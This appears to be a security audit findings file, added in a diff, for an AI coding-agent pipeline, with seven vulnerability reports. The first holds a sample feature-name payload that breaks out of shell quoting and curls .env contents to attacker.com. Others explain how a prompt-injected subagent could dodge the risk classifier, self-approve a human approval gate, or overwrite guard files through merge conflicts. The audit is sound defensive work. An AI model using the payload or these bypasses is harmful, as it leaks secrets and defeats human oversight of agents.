@@ -1,0 +1,62 @@
+{
+  "findings": [
+    {
+      "severity": "HIGH",
+      "title": "Feature name sanitizer misses single-quote — shell argument breakout in git/gh commands",
+      "description": "sanitizeFeatureName() in mcp/lib/sanitize.js strips \", \\, `, $, newlines, and control chars but does NOT strip single quotes ('). The apply skill (skills/apply/SKILL.md line 104) instructs the model to run: git commit -m \"feat(forge): <safe-feature>\". If the model (or a Bash tool implementation) uses single-quote wrapping instead of double-quote wrapping — which is common on Unix shells — a feature name containing a single quote breaks out of the argument. Example: feature name \"test' && curl attacker.com/exfil?d=$(cat .env) && echo '\" would break a single-quoted shell argument. While the skill text uses double quotes (where ' is inert), the model's actual Bash invocation is not mechanically constrained to double-quoting. The same applies to gh pr create --title on line 116. Since the model interprets the skill prompt and constructs the actual shell command, there is no code-level guarantee that double quotes are used.",
+      "file": "mcp/lib/sanitize.js",
+      "line": "21",
+      "exploitability": "Requires the executing model to use single-quote wrapping in its Bash call, which is a realistic code generation pattern. The attacker controls the feature name via $ARGUMENTS. Precondition: gitIntegration.autoCommit or autoPR must be enabled."
+    },
+    {
+      "severity": "HIGH",
+      "title": "LEAN-lite risk classifier evasion — risk-surface code outside canonical sections bypasses reviewer gate",
+      "description": "lean-risk-classify.mjs only extracts file paths and code blocks from two specific markdown sections: '## Files to create' and '## Files to modify'. If the coder agent writes risk-surface code (child_process.spawn, fs.writeFile, crypto, network calls) in other sections of the handoff — such as '## Implementation notes', '## Approach', or any non-standard heading — the classifier returns skipReviewers: true and no reviewer sees the code. A compromised or manipulated coder agent could intentionally place dangerous code in a section the classifier does not scan, bypassing the LEAN-lite reviewer gate entirely. The classifier is the sole enforcement boundary in LEAN mode (the most common mode per project.json).",
+      "file": "scripts/lean-risk-classify.mjs",
+      "line": "191-199",
+      "exploitability": "High. The coder agent is an AI model whose output format is not mechanically enforced. A prompt-injected coder (via a malicious plan or user input) could structure its handoff to place all risk-surface code in sections the classifier ignores. LEAN mode is the default."
+    },
+    {
+      "severity": "HIGH",
+      "title": "Worktree merge auto-commits uncommitted changes with -A and no content inspection",
+      "description": "In forge-worktree.js merge() (line 166-174), if the worktree has uncommitted changes, the script runs 'git add -A' followed by 'git commit' with a generic message before merging into the main branch. This auto-commits EVERYTHING in the worktree working tree — including files that an agent may have written but that failed review, files containing secrets that were accidentally created, or malicious files placed by a compromised subagent. There is no review, no content inspection, and no allowlist. The commit message is generic ('feat(forge): apply changes'), obscuring what was actually committed. This auto-committed content then gets merged into the main branch.",
+      "file": "bin/forge-worktree.js",
+      "line": "166-174",
+      "exploitability": "Exploitable whenever a worktree merge is triggered and the worktree has uncommitted changes. A compromised implementer subagent could write arbitrary files (e.g., a backdoor in a source file, a modified hook) that get auto-committed and merged without any human or reviewer inspection."
+    },
+    {
+      "severity": "HIGH",
+      "title": "Worktree merge pass-2 silently uses '-X theirs' strategy — attacker-controlled branch wins all conflicts",
+      "description": "In forge-worktree.js merge() (lines 205-210), when the initial merge has conflicts, the script automatically retries with 'git merge branch --no-edit -X theirs'. This means the worktree branch (attacker-controlled if a subagent is compromised) wins ALL merge conflicts silently. If the main branch has security-critical code (e.g., hooks, guards, enforcement scripts) and the worktree branch has modified versions, the worktree version overwrites the main branch version with no human approval. The 'autoResolved: true' flag in the JSON output is the only signal, easily missed in automated pipelines.",
+      "file": "bin/forge-worktree.js",
+      "line": "205-210",
+      "exploitability": "Exploitable when: (1) a worktree branch modifies security-critical files that also changed on main, creating a conflict, and (2) the merge is triggered (via /forge:apply step 9). The attacker's version silently wins. Realistic in multi-pipeline scenarios where main and worktree diverge on hook/guard files."
+    },
+    {
+      "severity": "MEDIUM",
+      "title": "Apply skill instructs 'git add -A' before auto-commit — stages secrets and untracked files",
+      "description": "skills/apply/SKILL.md step 5 instructs the model to run 'git add -A' before committing. This stages ALL files in the working tree, including: .env files, credentials accidentally created by agents, node_modules if not gitignored, and any other sensitive files. While .gitignore provides partial protection, any un-ignored sensitive file (e.g., .pipeline/forge-config.json containing API routing, or agent-generated credential files) gets committed and potentially pushed to a remote. The same pattern repeats in step 8 for worktree commits (line 121: 'git -C <worktreePath> add -A').",
+      "file": "skills/apply/SKILL.md",
+      "line": "104, 121",
+      "exploitability": "Requires gitIntegration.autoCommit to be enabled (opt-in). Exploitable if any agent creates a file containing secrets that isn't in .gitignore. Since agents write arbitrary files as part of implementation, this is a realistic scenario."
+    },
+    {
+      "severity": "MEDIUM",
+      "title": "Gate #2 approval is a file write with no authentication — any session can approve",
+      "description": "The approve skill (skills/approve/SKILL.md) approves gates by writing {status: 'approved'} to gate-pending.json and calling forge_update_run. There is no authentication, no session binding, and no approval token. Any Claude Code session with file write access to .pipeline/gate-pending.json can approve Gate #2. In a multi-session or worktree scenario, a compromised or rogue subagent session could approve its own gate by writing the JSON file directly, bypassing the intended human-in-the-loop. The gate file location is deterministic (<worktreePath>/.pipeline/gate-pending.json).",
+      "file": "skills/approve/SKILL.md",
+      "line": "29-35",
+      "exploitability": "Requires a compromised subagent or a second session. In the worktree architecture, subagents spawned during /forge:implement run in the worktree directory and have write access to .pipeline/. A subagent instructed (via prompt injection in a plan) to write to .pipeline/gate-pending.json could self-approve."
+    },
+    {
+      "severity": "MEDIUM",
+      "title": ".cmd launcher files contain hardcoded absolute paths with spaces — path injection via OneDrive rename",
+      "description": "forge-observer.cmd and forge.cmd contain hardcoded paths like 'C:\\Users\\cuj\\OneDrive - Nemlig.com\\Skrivebord\\node-v24.14.0-win-x64\\node.exe'. These are auto-generated by hooks/mcp-deps-install.js. The paths are double-quoted, which protects against spaces. However, the generator trusts the resolved node path without validation. If an attacker can influence the OneDrive sync folder name or the node installation path (e.g., via a symlink or junction point at the expected location pointing elsewhere), they control which binary executes as 'node'. The .cmd files are regenerated each session, so the attack must persist at the filesystem level.",
+      "file": "bin/forge-observer.cmd",
+      "line": "4",
+      "exploitability": "Requires local filesystem access to create a junction/symlink at the expected node path, or to manipulate OneDrive folder naming. This is a supply-chain risk rather than a remote exploit. Low practical exploitability but the hardcoded-path-with-no-integrity-check pattern is a real attack surface."
+    }
+  ],
+  "completedLenses": ["bin", "scripts", "skills"],
+  "status": "complete"
+}
